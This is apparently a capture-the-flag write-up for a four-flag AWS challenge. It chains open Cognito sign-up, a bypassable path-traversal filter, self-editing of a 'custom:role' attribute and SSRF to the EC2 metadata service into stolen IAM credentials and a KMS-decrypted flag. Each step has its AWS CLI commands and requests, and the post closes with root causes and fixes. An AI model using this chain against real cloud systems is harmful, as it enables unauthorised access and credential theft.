---
title: Dubai Cyber Challenge 2026 - Cold Storage
description: Writeup for Cold Storage, a 4-flag Cloud/AWS challenge from Dubai Cyber Challenge 2026 - chaining an open Cognito signup, a homegrown path-traversal filter, a client-editable authorization attribute, and SSRF to IMDS into full IAM credential theft and a KMS-protected flag.
date: 2026-09-17
slug: Dubai-Cyber-Challenge-2026-Cold-Storage
teaser: /assets/images/dubai-cyber-challenge-2026/logo.png
categories:
- capture the flag
- infosec
tags:
- ctf
- aws
- cloud
- cognito
- ssrf
- imds
- kms
- dubai cyber challenge
---
![Dubai Cyber Challenge 2026](/assets/images/dubai-cyber-challenge-2026/logo.png)

**Target:** `http://18.143.180.204/` (AWS EC2, ap-southeast-1, Gunicorn/Flask)
**Category:** Cloud / AWS - Hard, 120 pts, 4 flags
**AWS Account:** `332173347248`

## Recon

`nmap` shows 80/tcp Gunicorn, "Dubai Digital Archive" - a Python/Flask app.

The landing page describes a 3-tier classification scheme: PUBLIC / RESTRICTED / CONFIDENTIAL. `/register` is a dead end - self-service signup was withdrawn per the site copy, and `POST /register` returns 405 (blocked server-side, not just hidden UI).

![Access Denied on /register](/assets/images/dubai-cyber-challenge-2026-cold-storage/01-register-access-denied.jpg)

`/login`'s inline `<script>` builds the login POST body itself and reveals:

```js
const client_id = "6ldqvp9ntq6e844bsbfr0qgoe1"
```

![Inline script on /login exposing the Cognito client_id](/assets/images/dubai-cyber-challenge-2026-cold-storage/00-login-js-client-id.png)

That's a textbook **AWS Cognito App Client ID** format.

![Portal login page](/assets/images/dubai-cyber-challenge-2026-cold-storage/02-login-page.jpg)

## Stage 1 - Access flag: bypass the closed registration

The website's own `/register` route is blocked, but Cognito's public `SignUp` API is a *separate* AWS service the Flask app doesn't control. I hit it directly with the AWS CLI (no credentials needed for this unauthenticated Cognito operation):

```
$ aws cognito-idp sign-up --region ap-southeast-1 \
    --client-id 6ldqvp9ntq6e844bsbfr0qgoe1 \
    --username jamoski --password 'P@ssw0rd123' \
    --no-sign-request
{
    "UserConfirmed": true,
    "UserSub": "196ae5cc-20a1-70dc-814e-b59d7148afe8"
}
```

(Setting an `email` attribute at signup fails with `NotAuthorizedException: A client attempted to write unauthorized attribute` - the pool restricts which attributes a client may write at signup. Username+password alone works, and `UserConfirmed: true` comes back immediately - no email verification step.)

Logged in through the app's real `/login` UI form -> `Set-Cookie: session=...`, landing on the authenticated Document Archive:

![Authenticated home, dda-public-records](/assets/images/dubai-cyber-challenge-2026-cold-storage/03-authenticated-home.jpg)

Flag found in `dda-public-records/ministry-correspondence/staff-onboarding.txt`: `THM{c0gn1t0_s1gn_up}`

![Access flag in staff-onboarding.txt](/assets/images/dubai-cyber-challenge-2026-cold-storage/04-access-flag-staff-onboarding.jpg)

## Stage 2 - Archive flag: reach storage the UI never links to

The authenticated home page browses `?storage=../dda-public-records/<path>`. The app's `parse_path()` strips exactly `n` occurrences of `"../"` where `n` is however many appear in the query value - i.e. it's naive path-traversal "protection" that a solver directly controls the count of. Going one level further than the app expects:

```
GET /?storage=../../
```

lists **every** bucket whose name starts with `dda-`, not just the default one - revealing `dda-classified-archive` (never linked from the UI).

![Path traversal reveals dda-classified-archive](/assets/images/dubai-cyber-challenge-2026-cold-storage/05-all-repositories-traversal.jpg)

Inside it: `restricted-documents/00-INDEX.txt` (plaintext, readable with our low-privilege Cognito identity credentials) contains: `THM{s3_p4th_tr4v3rs4l}`

![Archive flag in 00-INDEX.txt](/assets/images/dubai-cyber-challenge-2026-cold-storage/06-archive-flag-00-index.jpg)

The sibling `restricted-documents/flag.txt` in the same folder is SSE-KMS-encrypted and our Cognito identity-pool role (`cognito-dda-secure-portal_auth_role`) gets `AccessDenied` on `kms:Decrypt` - that's the pointer to the next stage. The traversal also exposed a full copy of the app's own source (`dda-classified-archive/portal-application/`), including `app.py` - reading it explains every mechanic used above and below.

![flag.txt: KMS AccessDenied via the low-priv Cognito role](/assets/images/dubai-cyber-challenge-2026-cold-storage/07-flag-txt-kms-accessdenied.jpg)

## Stage 3 - Escalation flag: become "director"

From `app.py`:

```python
def is_admin():
    user_details = cognito_idp.get_user(AccessToken=session["access_token"])["UserAttributes"]
    role = next((a["Value"] for a in user_details if a["Name"] == "custom:role"), "")
    return role == "director"
```

So admin-ness is just a **user-controlled custom Cognito attribute**. Signup blocks writing arbitrary attributes, but *self-updating your own attributes post-confirmation* is a different Cognito permission - and it isn't locked down:

```
$ aws cognito-idp initiate-auth --region ap-southeast-1 \
    --client-id 6ldqvp9ntq6e844bsbfr0qgoe1 --auth-flow USER_PASSWORD_AUTH \
    --auth-parameters USERNAME=jamoski,PASSWORD='P@ssw0rd123' \
    --no-sign-request > jamoski_auth.json
ACCESS_TOKEN=$(jq -r .AuthenticationResult.AccessToken jamoski_auth.json)

$ aws cognito-idp get-user --region ap-southeast-1 --access-token "$ACCESS_TOKEN" --no-sign-request
{
    "Username": "jamoski",
    "UserAttributes": [
        {"Name": "custom:role", "Value": "analyst"},
        {"Name": "sub", "Value": "196ae5cc-20a1-70dc-814e-b59d7148afe8"}
    ]
}

$ aws cognito-idp update-user-attributes --region ap-southeast-1 \
    --access-token "$ACCESS_TOKEN" \
    --user-attributes Name="custom:role",Value="director" --no-sign-request

$ aws cognito-idp get-user --region ap-southeast-1 --access-token "$ACCESS_TOKEN" --no-sign-request
{
    "Username": "jamoski",
    "UserAttributes": [
        {"Name": "custom:role", "Value": "director"},
        {"Name": "sub", "Value": "196ae5cc-20a1-70dc-814e-b59d7148afe8"}
    ]
}
```

(New accounts default to `custom:role = analyst` - confirmed above - so the self-update is a genuine privilege *escalation*, not just a role assignment.)

Note: revisiting `GET /` after the escalation does **not** auto-redirect to an admin view (still shows the regular `dda-public-records` index) - `auth_checker()`'s `is_admin()` redirect only fires from the `/login` flow. `/admin_panel` still has to be requested directly:

![Home page post-escalation - no auto-redirect](/assets/images/dubai-cyber-challenge-2026-cold-storage/08-home-after-director-escalation.jpg)

`GET /admin_panel` (same Flask session cookie, no re-login needed - the app re-checks Cognito on every request) now serves `admin.html` - a "Document Retrieval Panel" gated on `CLEARANCE: DIRECTOR` that POSTs an arbitrary URL to `/preview_document`, which server-side does a raw, unrestricted `requests.get(data["url"])` - classic **SSRF**, gated only by (bypassed) admin-only access.

![Admin panel - Document Retrieval Panel, director clearance](/assets/images/dubai-cyber-challenge-2026-cold-storage/09-admin-panel-director-clearance.jpg)

Point it at the EC2 instance metadata service (via the panel's own form this time, not curl):

```
POST /preview_document  {"url":"http://169.254.169.254/latest/user-data"}
```

returns the instance's cloud-init bootstrap script, which embeds: `THM{ssrf_t0_1mds_cr3ds}`

![Escalation flag via SSRF to IMDS user-data](/assets/images/dubai-cyber-challenge-2026-cold-storage/10-escalation-flag-ssrf-userdata.jpg)

(IMDSv1 is enabled with no token/hop-limit hardening, so a plain GET through the SSRF is enough - no need to fake a PUT for an IMDSv2 token.)

## Stage 4 - Classified flag: steal real IAM creds and decrypt

Same SSRF, different metadata path:

```
POST /preview_document  {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/challenge_instance"}
```

returns full temporary AWS credentials for the **EC2 instance role** (`arn:aws:sts::332173347248:assumed-role/challenge_instance/...`) - a completely different, much more privileged identity than the Cognito identity-pool role the app itself uses for S3 browsing.

![Stolen instance-role credentials via SSRF](/assets/images/dubai-cyber-challenge-2026-cold-storage/11-classified-flag-ssrf-iam-creds.jpg)

Exporting those creds locally goes straight to AWS, bypassing the buggy web app entirely:

```
$ source instance_creds.env   # AWS_ACCESS_KEY_ID / SECRET / SESSION_TOKEN from the SSRF response

$ aws sts get-caller-identity
{
    "UserId": "AROAU2VYTBGYKMMR7ISVV:i-04d4148690506c174",
    "Account": "332173347248",
    "Arn": "arn:aws:sts::332173347248:assumed-role/challenge_instance/i-04d4148690506c174"
}

$ aws s3api get-object --region ap-southeast-1 \
    --bucket dda-classified-archive --key restricted-documents/flag.txt \
    classified_flag.txt
{
    "SSEKMSKeyId": "arn:aws:kms:ap-southeast-1:332173347248:key/9a6fd248-80d1-455c-bede-7daba70bfede",
    "ServerSideEncryption": "aws:kms",
    ...
}

$ cat classified_flag.txt
THM{km5_cl4ss1f13d_unl0ck3d}
```

The AWS CLI transparently calls `kms:Decrypt` using the *instance role's* permissions (which the Cognito role lacked) and hands back plaintext.

## Root causes

1. Cognito App Client ID leaked client-side and its User Pool allows public self-service `SignUp` even though the website's own UI/route disabled registration - the two are enforced independently and only one was actually locked down.
2. Homegrown "path traversal protection" (`parse_path`) counts and strips `../` tokens instead of resolving/canonicalizing the path - trivially bypassed by adding more `../` than intended.
3. Authorization decided entirely by a user-editable Cognito custom attribute (`custom:role`), with no server-side check that only a privileged caller may set it.
4. Admin panel exposes unrestricted server-side URL fetch (SSRF) with no allow-list, reachable once step 3 is bypassed.
5. IMDSv1 enabled on the EC2 instance, and the instance role is scoped far more broadly (S3 read + KMS decrypt on the classified bucket/key) than anything the web app's own runtime identity should ever need.

## Fix

- Disable Cognito's own self-service `SignUp` at the User Pool / app client level (`ALLOW_USER_SRP_AUTH` etc. don't matter if `SignUp` itself is open); don't rely on hiding a website route alone.
- Use `os.path.realpath`/`pathlib.resolve()` and validate the result stays under the intended prefix, never a manual `../` counter.
- Make `custom:role` an **immutable**, admin-only-writable Cognito attribute (`AttributeDataType` schema flag), or better, don't trust client-editable attributes for authorization at all - look up role from a server-controlled store.
- Add an allow-list / block private IP ranges (incl. `169.254.169.254`) for any server-side "fetch this URL" feature.
- Require IMDSv2 (session-token hop) on the EC2 instance, and scope the instance role to least privilege - it shouldn't be able to read or decrypt the classified bucket at all if the web app never needs to.
